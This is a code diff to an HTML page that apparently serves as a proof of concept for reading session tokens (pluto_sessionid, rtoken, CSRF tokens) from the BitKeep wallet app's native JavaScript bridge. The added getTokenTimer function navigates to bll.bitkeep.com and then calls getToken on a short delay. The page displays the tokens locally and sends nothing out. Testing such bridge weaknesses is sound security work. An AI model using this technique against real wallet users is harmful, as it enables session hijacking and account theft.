@@ -46,7 +46,7 @@
 <body>
     <h1>Token 获取演示</h1>
     <button onclick="activityWinnerDialogTimer()">activityWinnerDialog</button>
-    <button onclick="getToken()">获取Token</button>
+    <button onclick="getTokenTimer()">获取Token</button>
     <div id="result"></div>
 
     <script>
@@ -76,35 +76,40 @@
             ]))
         }
 
+        function getTokenTimer() {
+            setTimeout(getToken, 500);
+            document.location.href = "https://bll.bitkeep.com";
+        }
+
         // 获取Token函数
         function getToken() {
             // 创建唯一回调ID
             const callbackId = "token_" + Date.now();
-            
+
             // 调用原生方法获取Token
             window.BitKeepJS.postMessage(JSON.stringify([
                 "getToken",    // 方法名
                 callbackId     // 回调ID
             ]));
-            
+
             // 注册回调处理函数
-            window.BitKeepJS.registerHandler(callbackId, function(error, tokenData) {
+            window.BitKeepJS.registerHandler(callbackId, function (error, tokenData) {
                 if (error) {
                     showResult("获取Token失败: " + error, true);
                     return;
                 }
-                
+
                 try {
                     // 解析返回的Token数据
                     const tokenInfo = JSON.parse(tokenData);
-                    
+
                     // 格式化显示Token信息
                     let resultText = "获取Token成功:\n";
                     resultText += "- pluto_sessionid: " + (tokenInfo.pluto_sessionid || "未获取") + "\n";
                     resultText += "- rtoken: " + (tokenInfo.rtoken || "未获取") + "\n";
                     resultText += "- csrfToken: " + (tokenInfo.csrfToken || "未获取") + "\n";
                     resultText += "- encryptCsrfToken: " + (tokenInfo.encryptCsrfToken || "未获取");
-                    
+
                     showResult(resultText);
                 } catch (e) {
                     showResult("解析Token数据失败: " + e.message, true);
@@ -115,7 +120,7 @@
         // 显示结果到页面
         function showResult(content, isError = false) {
             const resultDiv = document.getElementById("result");
-            
+
             // 处理换行符，确保在HTML中正确显示
             if (typeof content === "string") {
                 content = content.replace(/\n/g, "<br>");
@@ -123,7 +128,7 @@
             } else {
                 resultDiv.textContent = content;
             }
-            
+
             resultDiv.className = isError ? "error" : "";
         }
         initDSBridge();
